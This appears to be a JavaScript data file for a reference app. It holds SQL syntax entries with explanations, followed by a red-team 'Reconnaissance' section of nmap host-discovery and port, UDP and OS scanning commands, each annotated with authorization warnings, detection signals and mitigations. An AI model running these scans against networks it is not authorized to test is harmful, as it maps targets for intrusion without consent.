{id:"sql-having", cat:"SQL", title:"HAVING (filter groups)", level:"intermediate", example_output:"-- ... GROUP BY dept HAVING AVG(salary) > 70000;\ndept  avg\nEng   91500", desc:"HAVING filters whole groups after aggregation, using conditions on aggregate results (HAVING COUNT(*) > 1). It's the group-level counterpart to WHERE: WHERE removes rows before grouping, HAVING removes groups after. Rule of thumb — put a condition in WHERE if it's about individual rows, in HAVING if it's about a group's aggregate. The order is WHERE, then GROUP BY, then HAVING.",
 code:{sql:`SELECT c1, aggregate(c2)
FROM t
GROUP BY c1
HAVING condition;`}},

/* ---------- joining tables ---------- */
{id:"sql-inner-join", cat:"SQL", title:"INNER JOIN", level:"intermediate", example_output:"-- employees JOIN departments ON employees.dept_id = departments.id\nname  department\nAda   Engineering\nSam   Operations", desc:"An INNER JOIN combines rows from two tables where the ON condition matches, returning only the pairs that have a counterpart on both sides — unmatched rows from either table are dropped. It's the default and most common join, used to follow a foreign key (an employee's dept_id to a department's id). Qualify column names (t1.c1) when both tables share one.",
 code:{sql:`SELECT c1, c2
FROM t1
INNER JOIN t2 ON condition;`}},
{id:"sql-left-join", cat:"SQL", title:"LEFT JOIN", level:"intermediate", example_output:"-- employees LEFT JOIN departments\nname  department\nAda   Engineering\nSam   Operations\nLee   NULL", desc:"A LEFT JOIN (LEFT OUTER JOIN) returns every row from the left table, attaching matching right-table columns where they exist and NULLs where they don't. Use it when the left side is the one you must keep — 'all employees, with their department if any'. A LEFT JOIN with WHERE right_col IS NULL is the classic way to find left rows that have no match.",
 code:{sql:`SELECT c1, c2
FROM t1
LEFT JOIN t2 ON condition;`}},
{id:"sql-right-join", cat:"SQL", title:"RIGHT JOIN", level:"intermediate", example_output:"-- employees RIGHT JOIN departments\nname  department\nAda   Engineering\nSam   Operations\nNULL  Sales", desc:"A RIGHT JOIN is the mirror of LEFT JOIN: it keeps every row from the right table and fills NULLs where the left has no match. It's less common because you can always rewrite it as a LEFT JOIN by swapping the table order, which many find easier to read. Here 'all departments, with employees where any' keeps Sales even though nobody works there.",
 code:{sql:`SELECT c1, c2
FROM t1
RIGHT JOIN t2 ON condition;`}},
{id:"sql-full-join", cat:"SQL", title:"FULL OUTER JOIN", level:"intermediate", example_output:"-- employees FULL OUTER JOIN departments\nname  department\nAda   Engineering\nSam   Operations\nLee   NULL\nNULL  Sales", desc:"A FULL OUTER JOIN keeps every row from both tables, pairing them where the condition matches and using NULLs on whichever side is missing — effectively LEFT and RIGHT combined. Use it to reconcile two sets and see everything, matched or not. Dialect note: MySQL has no FULL OUTER JOIN, so you emulate it with a LEFT JOIN UNION a RIGHT JOIN.",
 code:{sql:`SELECT c1, c2
FROM t1
FULL OUTER JOIN t2 ON condition;`}},
{id:"sql-cross-join", cat:"SQL", title:"CROSS JOIN", level:"intermediate", example_output:"-- 2 sizes CROSS JOIN 2 colours = 4 rows\nsize  colour\nS     red\nS     blue\nM     red\nM     blue", desc:"A CROSS JOIN produces the Cartesian product — every row of the first table paired with every row of the second, with no ON condition. The result has (rows of t1 x rows of t2) rows, which explodes fast, so it's rarely wanted by accident. Legitimate uses include generating all combinations (sizes x colours) or building a grid of dates.",
 code:{sql:`SELECT c1, c2
FROM t1
CROSS JOIN t2;`}},
{id:"sql-cross-join2", cat:"SQL", title:"Implicit cross join (comma)", level:"intermediate", example_output:"-- FROM employees e, departments d WHERE e.dept_id = d.id\n-- (same result as an INNER JOIN)\nname  department\nAda   Engineering\nSam   Operations", desc:"Listing tables comma-separated in FROM (FROM t1, t2) is the old-style implicit cross join — it also produces the Cartesian product. Adding a WHERE that matches keys turns it into an equi-join, which is how joins were written before the explicit JOIN keyword. Prefer explicit JOIN ... ON in new code: it separates the join condition from row filtering and prevents accidental Cartesian blowups when a WHERE is forgotten.",
 code:{sql:`SELECT c1, c2
FROM t1, t2;`}},
{id:"sql-self-join", cat:"SQL", title:"Self join", level:"intermediate", example_output:"-- employees E JOIN employees M ON E.manager_id = M.id\nemployee  manager\nSam       Ada\nKim       Ada", desc:"A self join joins a table to itself, using two different aliases so you can compare rows within the same table. The classic case is a hierarchy stored in one table — employees with a manager_id pointing at another employee's id — where you alias the table as E (the worker) and M (the manager) and join E.manager_id = M.id. Aliases are mandatory here to tell the two 'copies' apart.",
 code:{sql:`SELECT c1, c2
FROM t1 A
INNER JOIN t1 B ON condition;`}},

/* ---------- set operators & predicates ---------- */
{id:"sql-union", cat:"SQL", title:"UNION [ALL]", level:"intermediate", example_output:"-- SELECT name FROM ny  UNION  SELECT name FROM sf\nname\nAda\nSam\nLee\n-- Ada was in both; UNION kept one row, UNION ALL would keep two", desc:"UNION stacks the rows of two SELECTs into one result set (vertically), unlike a JOIN which combines columns (horizontally). Both queries must return the same number of columns with compatible types, and the column names come from the first query. Plain UNION removes duplicate rows (an extra sort/hash cost); UNION ALL keeps every row and is faster — use it when you know there are no duplicates or you want to keep them.",
 code:{sql:`SELECT c1, c2 FROM t1
UNION [ALL]
SELECT c1, c2 FROM t2;`}},
{id:"sql-intersect", cat:"SQL", title:"INTERSECT", level:"intermediate", example_output:"-- customers who are ALSO employees\nname\nAda\n-- only rows present in both queries survive", desc:"INTERSECT returns only the rows that appear in both query results — the overlap of two sets. Like UNION, the two SELECTs must be column-compatible, and duplicates are removed. It answers 'which values are in both lists?'. Dialect note: some databases (older MySQL) have no INTERSECT, so you emulate it with an INNER JOIN or WHERE ... IN (subquery).",
 code:{sql:`SELECT c1, c2 FROM t1
INTERSECT
SELECT c1, c2 FROM t2;`}},
{id:"sql-minus", cat:"SQL", title:"MINUS / EXCEPT", level:"intermediate", example_output:"-- employees who are NOT managers\nname\nSam\nLee\n-- rows of query 1 that had any match in query 2 are removed", desc:"EXCEPT (called MINUS in Oracle) returns the rows from the first query that are not in the second — set subtraction. Column-compatible SELECTs, duplicates removed. It answers 'what's in A but not in B?', such as customers who never placed an order. Dialect note: write EXCEPT on PostgreSQL/SQL Server/SQLite and MINUS on Oracle; MySQL lacks both and is emulated with a LEFT JOIN ... WHERE right IS NULL.",
 code:{sql:`SELECT c1, c2 FROM t1
MINUS            -- EXCEPT in most databases
SELECT c1, c2 FROM t2;`}},
{id:"sql-like", cat:"SQL", title:"LIKE (pattern match)", level:"beginner", example_output:"-- WHERE name LIKE 'A%'   (names starting with A)\nname\nAda\nAmir", desc:"LIKE filters text by pattern using two wildcards: % matches any run of characters (including none) and _ matches exactly one. So 'a%' means starts-with-a, '%son' ends-with-son, and '%mit%' contains-mit. Matching is case-insensitive in some engines (MySQL) and case-sensitive in others (PostgreSQL, where ILIKE forces case-insensitive). Use NOT LIKE to invert, and an ESCAPE clause when you need to match a literal % or _.",
 code:{sql:`SELECT c1, c2 FROM t
WHERE c1 LIKE 'a%';   -- starts with a ; use NOT LIKE to negate`}},
{id:"sql-in", cat:"SQL", title:"IN (value list)", level:"beginner", example_output:"-- WHERE dept_id IN (1, 3)\nname   dept_id\nAda    1\nLee    3", desc:"IN tests whether a value matches any item in a list (or the result of a subquery), a compact alternative to chaining OR conditions: 'dept_id IN (1, 2, 3)' equals 'dept_id = 1 OR dept_id = 2 OR dept_id = 3'. NOT IN excludes the listed values. One important gotcha: if the list or subquery contains a NULL, NOT IN can return no rows at all, because comparing with NULL is 'unknown' — prefer NOT EXISTS in that case.",
 code:{sql:`SELECT c1, c2 FROM t
WHERE c1 IN (1, 2, 3);   -- NOT IN to exclude`}},
{id:"sql-between", cat:"SQL", title:"BETWEEN (range)", level:"beginner", example_output:"-- WHERE salary BETWEEN 50000 AND 60000\nname   salary\nSam    55000\nLee    60000", desc:"BETWEEN low AND high tests whether a value falls in a range, and it is inclusive of both endpoints — 'salary BETWEEN 50000 AND 70000' includes exactly 50000 and 70000. It works for numbers, dates, and text ordering. Because it's inclusive, be careful with dates: BETWEEN '2024-01-01' AND '2024-01-31' can miss late-in-the-day timestamps on the 31st, so a half-open range (>= start AND < next-day) is often safer. NOT BETWEEN inverts it.",
 code:{sql:`SELECT c1, c2 FROM t
WHERE c1 BETWEEN low AND high;`}},
{id:"sql-isnull", cat:"SQL", title:"IS [NOT] NULL", level:"beginner", example_output:"-- WHERE dept_id IS NULL   (employees with no department)\nname\nLee", desc:"NULL means 'unknown or absent', and it does not equal anything — not even another NULL — so you can never test it with = or <>. Use IS NULL to find missing values and IS NOT NULL to find present ones. This is exactly why 'WHERE c = NULL' silently returns nothing and is a classic beginner bug. To substitute a fallback for NULLs in the output, wrap the column in COALESCE(c, default).",
 code:{sql:`SELECT c1, c2 FROM t
WHERE c1 IS NULL;   -- or IS NOT NULL`}},

/* ---------- managing tables ---------- */
{id:"sql-create-table", cat:"SQL", title:"CREATE TABLE", level:"beginner", example_output:"-- creates the table; no rows returned\nTable 'employees' created — ready for INSERTs.", desc:"CREATE TABLE defines a new table: a name, then a comma-separated list of columns, each with a name and a data type, plus optional column constraints like PRIMARY KEY, NOT NULL, or DEFAULT. This is the schema — the shape every row must follow. Data type names vary by engine (INT/INTEGER, VARCHAR(n)/TEXT), and adding IF NOT EXISTS avoids an error when the table already exists.",
 code:{sql:`CREATE TABLE t (
  id    INT PRIMARY KEY,
  name  VARCHAR NOT NULL,
  price INT DEFAULT 0
);`}},
{id:"sql-drop-table", cat:"SQL", title:"DROP TABLE", level:"beginner", example_output:"Table 'employees' dropped — definition and all rows removed.", desc:"DROP TABLE permanently removes a table — its definition and all of its data — and can't be undone without a backup. It differs from DELETE (removes rows, keeps the table) and TRUNCATE (empties the table, keeps its structure). Add IF EXISTS to avoid an error when the table is already gone. Dropping a table that other tables reference by foreign key may be blocked until those references are handled.",
 danger:"Permanently removes the table and everything in it.",
 code:{sql:`DROP TABLE t;`}},
{id:"sql-truncate", cat:"SQL", title:"TRUNCATE TABLE", level:"intermediate", example_output:"Table 'logs' truncated — all rows removed, structure kept.", desc:"TRUNCATE TABLE removes every row at once while keeping the table's structure, so you can immediately insert again. It's much faster than DELETE for clearing a whole table because it typically deallocates data pages instead of logging each row — but that also means it usually can't be rolled back, skips row-level triggers, and often resets AUTO_INCREMENT/identity counters. Use DELETE when you need WHERE filtering, triggers, or transactional undo.",
 danger:"Deletes every row; usually cannot be rolled back and resets identity counters.",
 code:{sql:`TRUNCATE TABLE t;`}},
{id:"sql-add-column", cat:"SQL", title:"ALTER TABLE ADD column", level:"beginner", example_output:"-- existing rows get NULL / the DEFAULT\nColumn 'email' added to 'employees'.", desc:"ALTER TABLE ... ADD appends a new column to an existing table without recreating it. Existing rows receive NULL (or the column's DEFAULT) for the new field. You specify the column name and its data type, plus any inline constraints. On large tables this can be a slow, locking operation in some engines, so check how your database handles it before running it in production.",
 code:{sql:`ALTER TABLE t ADD column_name datatype;`}},
{id:"sql-drop-column", cat:"SQL", title:"ALTER TABLE DROP COLUMN", level:"beginner", example_output:"Column 'email' dropped from 'employees' — its data is gone.", desc:"ALTER TABLE ... DROP COLUMN removes a column and all the data stored in it — irreversible without a backup. Constraints, indexes, or views that depend on the column may block the drop or need dropping first. Dialect note: SQLite historically had limited support and required rebuilding the table, though recent versions added DROP COLUMN.",
 danger:"Permanently deletes the column and all data it holds.",
 code:{sql:`ALTER TABLE t DROP COLUMN c;`}},
{id:"sql-add-constraint", cat:"SQL", title:"ALTER TABLE ADD constraint", level:"intermediate", example_output:"Constraint 'fk_dept' added to 'employees'.", desc:"ALTER TABLE ... ADD CONSTRAINT attaches a rule to an existing table — a PRIMARY KEY, FOREIGN KEY, UNIQUE, or CHECK — and names it so you can drop it later by that name. Naming constraints explicitly (rather than letting the engine auto-name them) makes them far easier to manage. If the current data already violates the new rule, the database rejects the ALTER, so clean the data first.",
 code:{sql:`ALTER TABLE t ADD CONSTRAINT constraint_name constraint_definition;`}},
{id:"sql-drop-constraint", cat:"SQL", title:"ALTER TABLE DROP constraint", level:"intermediate", example_output:"Constraint 'fk_dept' dropped from 'employees'.", desc:"ALTER TABLE ... DROP CONSTRAINT removes a constraint by its name, lifting the rule it enforced (for example, allowing values a CHECK previously forbade). You need the constraint's name, which is why naming them at creation helps. Dialect note: MySQL doesn't use this generic form for every type — you drop with DROP PRIMARY KEY, DROP FOREIGN KEY fk_name, or DROP INDEX for a unique constraint.",
 code:{sql:`ALTER TABLE t DROP CONSTRAINT constraint_name;`}},
{id:"sql-rename-table", cat:"SQL", title:"Rename a table", level:"beginner", example_output:"Table 'emp' renamed to 'employees'.", desc:"ALTER TABLE ... RENAME TO gives a table a new name while keeping its data, columns, and (usually) its indexes. Beware that views, stored procedures, or application code referencing the old name will break until updated — the rename doesn't chase down those references. Syntax varies: MySQL also allows RENAME TABLE t1 TO t2, and SQL Server uses the sp_rename procedure.",
 code:{sql:`ALTER TABLE t1 RENAME TO t2;`}},
{id:"sql-rename-column", cat:"SQL", title:"Rename a column", level:"beginner", example_output:"Column 'fname' renamed to 'first_name' in 'employees'.", desc:"ALTER TABLE ... RENAME changes a column's name without touching its data or type. As with renaming a table, anything referencing the old column name — views, triggers, and app queries — must be updated. This exact syntax is relatively modern; some engines require the COLUMN keyword (RENAME COLUMN c1 TO c2), and older MySQL used CHANGE COLUMN, which also restates the type.",
 code:{sql:`ALTER TABLE t1 RENAME c1 TO c2;`}},

/* ---------- constraints ---------- */
{id:"sql-primary-key", cat:"SQL", title:"PRIMARY KEY (composite)", level:"intermediate", example_output:"-- rows must be unique on (c1, c2) and non-NULL\nTable created with a composite primary key.", desc:"A PRIMARY KEY uniquely identifies each row: the column(s) must be unique and non-NULL, and a table has at most one. Listing several columns — PRIMARY KEY (c1, c2) — makes a composite key that's unique on the combination, useful for link/junction tables. Most engines automatically create an index on the primary key, which is why lookups by it are fast.",
 code:{sql:`CREATE TABLE t (
  c1 INT,
  c2 INT,
  c3 VARCHAR,
  PRIMARY KEY (c1, c2)
);`}},
{id:"sql-foreign-key", cat:"SQL", title:"FOREIGN KEY", level:"intermediate", example_output:"-- c2 must match an existing t2.c2\nTable created; referential integrity enforced.", desc:"A FOREIGN KEY links a column to the primary key of another table, enforcing referential integrity: you can't insert a child row whose reference doesn't exist in the parent, and (depending on ON DELETE / ON UPDATE rules) deleting a referenced parent row is either blocked or cascades. Here c2 must match a value in t2. This is how relational tables stay consistent; the referenced column must be a PRIMARY or UNIQUE key.",
 code:{sql:`CREATE TABLE t1 (
  c1 INT PRIMARY KEY,
  c2 INT,
  FOREIGN KEY (c2) REFERENCES t2 (c2)
);`}},
{id:"sql-unique", cat:"SQL", title:"UNIQUE", level:"beginner", example_output:"-- the (c2, c3) combination must not repeat\nTable created with a unique constraint.", desc:"A UNIQUE constraint forbids duplicate values in a column or combination of columns, while still allowing the row to exist — unlike a primary key, a table can have several UNIQUE constraints and (in most engines) a UNIQUE column may hold one NULL. Use it for things that must not repeat but aren't the row's identity, like an email address. It's enforced by an automatically created unique index.",
 code:{sql:`CREATE TABLE t (
  c1 INT,
  c2 INT,
  UNIQUE (c2, c3)
);`}},
{id:"sql-check", cat:"SQL", title:"CHECK", level:"intermediate", example_output:"-- inserts violating (c1 > 0 AND c1 >= c2) are rejected\nTable created with a check constraint.", desc:"A CHECK constraint restricts the values a column may hold to those satisfying a boolean expression — CHECK (c1 > 0 AND c1 >= c2) rejects any row that fails it. It pushes a business rule into the database so invalid data can't be inserted from any client. Note: MySQL parsed but silently ignored CHECK until version 8.0.16, so verify your engine actually enforces it.",
 code:{sql:`CREATE TABLE t (
  c1 INT,
  c2 INT,
  CHECK (c1 > 0 AND c1 >= c2)
);`}},
{id:"sql-not-null", cat:"SQL", title:"NOT NULL", level:"beginner", example_output:"-- c2 can never be NULL\nTable created; c2 is required on every row.", desc:"NOT NULL requires a column to always have a value — any INSERT or UPDATE that would leave it NULL is rejected. It's the simplest data-quality guarantee, ensuring required fields like a name or email are never missing. Pair it with a DEFAULT when you want a fallback value supplied automatically instead of forcing every INSERT to specify the column.",
 code:{sql:`CREATE TABLE t (
  c1 INT PRIMARY KEY,
  c2 VARCHAR NOT NULL
);`}},

/* ---------- modifying data ---------- */
{id:"sql-insert-one", cat:"SQL", title:"INSERT one row", level:"beginner", example_output:"-- one new row written\n1 row affected.", desc:"INSERT INTO adds a new row: name the columns you're filling, then give a matching VALUES list in the same order. Columns you omit take their DEFAULT or NULL. Always listing the columns explicitly (rather than relying on table order) makes the statement robust if the schema later changes. The value order must line up with the column order exactly.",
 code:{sql:`INSERT INTO t (column_list)
VALUES (value_list);`}},
{id:"sql-insert-many", cat:"SQL", title:"INSERT multiple rows", level:"beginner", example_output:"-- three rows written in one statement\n3 rows affected.", desc:"A single INSERT can add several rows by listing multiple parenthesized VALUES tuples separated by commas. This is much faster than running one INSERT per row because it's one statement, one round-trip, and often one transaction. Every tuple must match the column list. Very large batches may hit a packet or parameter limit, so extremely big loads are usually chunked.",
 code:{sql:`INSERT INTO t (column_list)
VALUES
  (value_list),
  (value_list),
  (value_list);`}},
{id:"sql-insert-select", cat:"SQL", title:"INSERT ... SELECT", level:"intermediate", example_output:"-- rows from t2 copied into t1\n42 rows affected.", desc:"INSERT INTO ... SELECT copies rows from a query straight into a table instead of typing literal values — ideal for populating one table from another, archiving, or transforming data in bulk. The SELECT's columns must line up with the target column list in count and type. Because it's set-based, it moves many rows in one efficient statement.",
 code:{sql:`INSERT INTO t1 (column_list)
SELECT column_list
FROM t2;`}},
{id:"sql-update-where", cat:"SQL", title:"UPDATE (with WHERE)", level:"beginner", example_output:"-- only rows matching the condition change\n3 rows affected.", desc:"UPDATE changes existing rows: SET assigns new values to one or more columns, and WHERE decides which rows are affected. The single most important habit is to always include a WHERE clause (and ideally test it first with a SELECT) — an UPDATE without one rewrites every row in the table. You can set several columns at once, separated by commas.",
 code:{sql:`UPDATE t
SET c1 = new_value,
    c2 = new_value
WHERE condition;`}},
{id:"sql-update-all", cat:"SQL", title:"UPDATE all rows", level:"intermediate", example_output:"-- EVERY row updated\n1000 rows affected.", desc:"An UPDATE with no WHERE clause applies the change to every row in the table. That's occasionally intentional — resetting a flag across the board — but it's also the classic catastrophic mistake, so treat a missing WHERE as a red flag. Run it inside a transaction (BEGIN ...) so you can ROLLBACK if the count of affected rows surprises you.",
 danger:"No WHERE clause — this changes every row.",
 code:{sql:`UPDATE t
SET c1 = new_value;`}},
{id:"sql-delete-where", cat:"SQL", title:"DELETE (with WHERE)", level:"beginner", example_output:"-- matching rows removed\n5 rows affected.", desc:"DELETE FROM removes the rows that match the WHERE condition, leaving the table and the other rows intact. As with UPDATE, always specify WHERE and consider previewing the target rows with a SELECT first. Foreign-key references from other tables can block a delete or trigger cascading deletes, depending on how the relationship was defined.",
 code:{sql:`DELETE FROM t
WHERE condition;`}},
{id:"sql-delete-all", cat:"SQL", title:"DELETE all rows", level:"intermediate", example_output:"-- every row removed, table kept\n1000 rows affected.", desc:"DELETE FROM with no WHERE empties the entire table one row at a time, while keeping the table's structure. It's transactional and fires row triggers (so it can be rolled back), which is the difference from TRUNCATE — but for clearing a whole large table TRUNCATE is far faster. A WHERE-less DELETE is another statement to double-check before running.",
 danger:"No WHERE clause — this empties the whole table.",
 code:{sql:`DELETE FROM t;`}},

/* ---------- views ---------- */
{id:"sql-create-view", cat:"SQL", title:"CREATE VIEW", level:"intermediate", example_output:"-- creates a virtual table; query it like any table\nView 'v_active' created.", desc:"A view is a saved query that behaves like a virtual table: selecting from it runs its underlying SELECT each time, so it always reflects current data without storing a copy. Views simplify complex joins behind a friendly name and can restrict which columns or rows users see. Naming the view's columns (as here) is optional but documents the interface. Most views are read-only; simple ones can sometimes be updated.",
 code:{sql:`CREATE VIEW v (c1, c2) AS
SELECT c1, c2
FROM t;`}},
{id:"sql-view-check-option", cat:"SQL", title:"CREATE VIEW ... WITH CHECK OPTION", level:"advanced", example_output:"-- writes that violate the view's WHERE are rejected\nView created with check option.", desc:"WITH CHECK OPTION makes an updatable view enforce its own WHERE clause on writes: any INSERT or UPDATE through the view that would produce a row the view can't 'see' is rejected. Without it, you could insert a row that immediately vanishes from the view. LOCAL checks only this view's condition; CASCADED (often the default) also checks the conditions of any views this one is built on.",
 code:{sql:`CREATE VIEW v (c1, c2) AS
SELECT c1, c2
FROM t
WITH [CASCADED | LOCAL] CHECK OPTION;`}},
{id:"sql-recursive-view", cat:"SQL", title:"CREATE RECURSIVE VIEW", level:"advanced", example_output:"-- expands a hierarchy level by level until exhausted\nid  name       lvl\n1   CEO        1\n2   VP Eng     2\n3   Engineer   3", desc:"A recursive view repeatedly applies itself to walk hierarchical or graph data — organization charts, bill-of-materials, category trees. It has two parts joined by UNION: an anchor (the starting rows) and a recursive member (which references the view to expand the next level), stopping when the recursive part yields no new rows. Most engines express the same idea with a recursive CTE (WITH RECURSIVE).",
 code:{sql:`CREATE RECURSIVE VIEW v AS
  select_statement        -- anchor part
UNION [ALL]
  select_statement;       -- recursive part`}},
{id:"sql-temp-view", cat:"SQL", title:"CREATE TEMPORARY VIEW", level:"intermediate", example_output:"-- session-only; vanishes on disconnect\nTemporary view 'v_tmp' created.", desc:"A TEMPORARY (or TEMP) view exists only for the current database session and disappears automatically when you disconnect; it's visible only to that session. It's handy for breaking a complicated one-off analysis into readable named steps without leaving a permanent object behind. Like other views it stores no data — just the query definition.",
 code:{sql:`CREATE TEMPORARY VIEW v AS
SELECT c1, c2
FROM t;`}},
{id:"sql-drop-view", cat:"SQL", title:"DROP VIEW", level:"beginner", example_output:"View 'v_active' dropped — underlying tables untouched.", desc:"DROP VIEW removes a view's definition. Because a view stores no data of its own, dropping it discards only the saved query — the underlying tables and their rows are untouched. Add IF EXISTS to avoid an error when it's already gone. Other views or code that referenced this view will break until updated.",
 code:{sql:`DROP VIEW view_name;`}},

/* ---------- indexes ---------- */
{id:"sql-create-index", cat:"SQL", title:"CREATE INDEX", level:"intermediate", example_output:"-- speeds up lookups on (c1, c2)\nIndex 'idx_name' created.", desc:"An index is a sorted lookup structure the database maintains alongside a table so it can find rows by the indexed column(s) without scanning everything — the main tool for speeding up WHERE filters, JOINs, and ORDER BY. A multi-column index (c1, c2) helps queries that filter on c1, or on c1 and c2, in that left-to-right order. The trade-off: each index adds storage and slightly slows INSERT/UPDATE/DELETE, since it must be kept in sync.",
 code:{sql:`CREATE INDEX idx_name
ON t (c1, c2);`}},
{id:"sql-unique-index", cat:"SQL", title:"CREATE UNIQUE INDEX", level:"intermediate", example_output:"-- fast lookups AND no duplicate (c3, c4)\nUnique index 'idx_name' created.", desc:"A UNIQUE index does two jobs at once: it speeds up lookups like any index, and it forbids duplicate values in the indexed column(s) — which is in fact how engines enforce UNIQUE constraints under the hood. Creating one on existing data fails if duplicates are already present. Most engines still allow multiple NULLs in a unique index, since NULLs aren't considered equal to each other.",
 code:{sql:`CREATE UNIQUE INDEX idx_name
ON t (c3, c4);`}},
{id:"sql-drop-index", cat:"SQL", title:"DROP INDEX", level:"beginner", example_output:"Index 'idx_name' dropped — table data unaffected.", desc:"DROP INDEX removes an index. The table's data is unaffected — you're only discarding the auxiliary lookup structure — but queries that relied on it may slow down, so drop indexes deliberately (for instance, an unused one that's just costing write performance). Dialect note: syntax differs — some engines want DROP INDEX name ON table, others DROP INDEX name, and a unique index backing a constraint may need the constraint dropped instead.",
 code:{sql:`DROP INDEX idx_name;`}},

/* ---------- triggers & aggregates ---------- */
{id:"sql-create-trigger", cat:"SQL", title:"CREATE TRIGGER", level:"advanced", example_output:"-- fires automatically on the chosen event\nTrigger 'trigger_name' created.", desc:"A trigger is code the database runs automatically in response to INSERT, UPDATE, or DELETE on a table. You choose the timing (BEFORE the change, to validate or adjust the incoming row, or AFTER, to cascade effects) and the granularity (FOR EACH ROW, or once per statement). Triggers are powerful for auditing and enforcing rules, but because they fire invisibly they can make behaviour hard to debug — use them sparingly and document them.",
 code:{sql:`CREATE OR REPLACE TRIGGER trigger_name
  { BEFORE | AFTER }             -- when
  { INSERT | UPDATE | DELETE }   -- event
  ON table_name
  FOR EACH ROW                   -- or FOR EACH STATEMENT
EXECUTE stored_procedure;`}},
{id:"sql-trigger-example", cat:"SQL", title:"CREATE TRIGGER (example)", level:"advanced", example_output:"-- runs for each row just before it enters person\nTrigger 'before_insert_person' created.", desc:"This concrete trigger runs before every row is inserted into person — a common place to validate or normalize data, for instance rejecting a negative age, filling a created_at timestamp, or lowercasing an email. BEFORE triggers can modify the incoming row (via NEW in MySQL/PostgreSQL) before it's written; AFTER triggers see the final row and are used to update other tables. The exact body syntax varies significantly by engine.",
 code:{sql:`CREATE TRIGGER before_insert_person
BEFORE INSERT
ON person FOR EACH ROW
EXECUTE stored_procedure;`}},
{id:"sql-drop-trigger", cat:"SQL", title:"DROP TRIGGER", level:"beginner", example_output:"Trigger 'trigger_name' dropped — table data unaffected.", desc:"DROP TRIGGER removes a trigger so the associated table no longer runs that automatic code on its events. The table and its data are unaffected. This is worth knowing when a trigger is causing unexpected side effects during bulk loads — temporarily dropping (or disabling) it can speed up or unblock the operation, after which you recreate it. Some engines require the table name too (DROP TRIGGER name ON table).",
 code:{sql:`DROP TRIGGER trigger_name;`}},
{id:"sql-aggregates", cat:"SQL", title:"Aggregate functions", level:"intermediate", example_output:"-- over the 4 employees:\nrow_count  average  total   smallest  largest\n4          78750    315000  60000     95000", desc:"Aggregate functions reduce many rows to one summary value: COUNT counts rows (COUNT(*) counts all, COUNT(col) skips NULLs), SUM and AVG total and average numbers, MIN and MAX find extremes. Alone they summarize the whole table; with GROUP BY they summarize each group. Note every aggregate except COUNT(*) ignores NULLs, which can quietly skew an AVG.",
 code:{sql:`SELECT
  COUNT(*) AS row_count,
  AVG(c2)  AS average,
  SUM(c2)  AS total,
  MIN(c2)  AS smallest,
  MAX(c2)  AS largest
FROM t;`}},

/* ================= RECONNAISSANCE ================= */
{id:"recon-nmap-sweep", level:"intermediate",requires:{"tool":"nmap"},updated:"2026-07", cat:"Reconnaissance", title:"Service & version scan",
 desc:"Fingerprint open ports, services, and versions on a host or subnet. Requires nmap.",
 danger:"Scan only systems you are authorized to test.",
 team:"red", tags:["network","recon","quick-win"], attack:["T1046"],
 detect:"IDS/flow logs show many ports from one source in a short window; alert on scan signatures (e.g. Suricata ET SCAN).",
 mitigate:"Rate-limit and segment networks; restrict management ports; monitor east-west traffic.",
 code:{
  linux:`nmap -sV -p- {{TARGET:10.0.0.0/24}} -oA scan`,
  mac:`nmap -sV -p- {{TARGET:10.0.0.0/24}} -oA scan`,
  ps:`# requires nmap in PATH
nmap -sV -p- {{TARGET:10.0.0.0/24}} -oA scan`
 }},

/* --- host discovery & port scanning --- */
{id:"recon-host-discovery", level:"intermediate",requires:{"tool":"nmap"},updated:"2026-07", cat:"Reconnaissance", related:["recon-nmap-top","recon-nmap-sweep"], title:"Live-host discovery (no port scan)",
 desc:"Find responsive hosts on a subnet via ICMP/ARP without scanning ports. Requires nmap.",
 danger:"Scan only systems you are authorized to test.",
 team:"red", tags:["recon","network","discovery"], attack:["T1018"],
 detect:"Bursts of ICMP echo or ARP requests to many addresses from one host; NIDS sweep signatures.",
 mitigate:"Segment networks; drop unsolicited ICMP at boundaries; alert on horizontal sweeps.",
 code:{
  linux:`nmap -sn {{TARGET:10.0.0.0/24}}`,
  mac:`nmap -sn {{TARGET:10.0.0.0/24}}`
 }},
{id:"recon-arp-scan", level:"intermediate",requires:{"elevation":true,"tool":"nmap"},updated:"2026-07", cat:"Reconnaissance", title:"ARP scan (local segment)",
 desc:"Enumerate live hosts on the local L2 segment via ARP — works even when ICMP is filtered. Needs nmap + root.",
 danger:"Local-segment scan; authorized networks only.",
 team:"red", tags:["recon","network","discovery"], attack:["T1018"],
 detect:"Flood of ARP who-has requests from one MAC; switch/NAC ARP-anomaly alerts.",
 mitigate:"Dynamic ARP Inspection; port security; segment broadcast domains.",
 code:{
  linux:`sudo nmap -PR -sn {{TARGET:10.0.0.0/24}}`,
  mac:`sudo nmap -PR -sn {{TARGET:10.0.0.0/24}}`
 }},
{id:"recon-nmap-top", level:"intermediate",requires:{"tool":"nmap"},updated:"2026-07", cat:"Reconnaissance", related:["recon-nmap-sweep","recon-banner-grab"], title:"Fast top-ports scan",
 desc:"Quick sweep of the most common TCP ports on a host. Requires nmap.",
 danger:"Scan only systems you are authorized to test.",
 team:"red", tags:["recon","network","scanning","quick-win"], attack:["T1046"],
 detect:"SYNs to many ports from one source in a short window; IDS portscan signatures.",
 mitigate:"Rate-limit; drop half-open floods; restrict exposed services.",
 code:{
  linux:`nmap --top-ports 100 -T4 {{IP:10.0.0.5}}`,
  mac:`nmap --top-ports 100 -T4 {{IP:10.0.0.5}}`
 }},
{id:"recon-nmap-udp", level:"intermediate",requires:{"elevation":true,"tool":"nmap"},updated:"2026-07", cat:"Reconnaissance", title:"UDP service scan",
 desc:"Probe common UDP services (DNS, SNMP, NTP, etc.). Slow; needs nmap + root.",
 danger:"Scan only systems you are authorized to test.",
 team:"red", tags:["recon","network","scanning"], attack:["T1046"],
 detect:"UDP probes to many ports; ICMP port-unreachable bursts from the target.",
 mitigate:"Filter unused UDP at the edge; rate-limit ICMP unreachables.",
 code:{
  linux:`sudo nmap -sU --top-ports 50 {{IP:10.0.0.5}}`,
  mac:`sudo nmap -sU --top-ports 50 {{IP:10.0.0.5}}`
 }},
{id:"recon-nmap-os", level:"intermediate",requires:{"elevation":true,"tool":"nmap"},updated:"2026-07", cat:"Reconnaissance", title:"OS detection",
 desc:"Fingerprint the target operating system from TCP/IP stack behavior. Needs nmap + root.",
 danger:"Scan only systems you are authorized to test.",
 team:"red", tags:["recon","network","scanning"], attack:["T1046"],
 detect:"Unusual TCP flag combinations / malformed probes characteristic of OS fingerprinting.",
 mitigate:"Normalize traffic at a proxy/firewall; limit exposed stack details.",
 code:{
  linux:`sudo nmap -O {{IP:10.0.0.5}}`,
  mac:`sudo nmap -O {{IP:10.0.0.5}}`
 }},
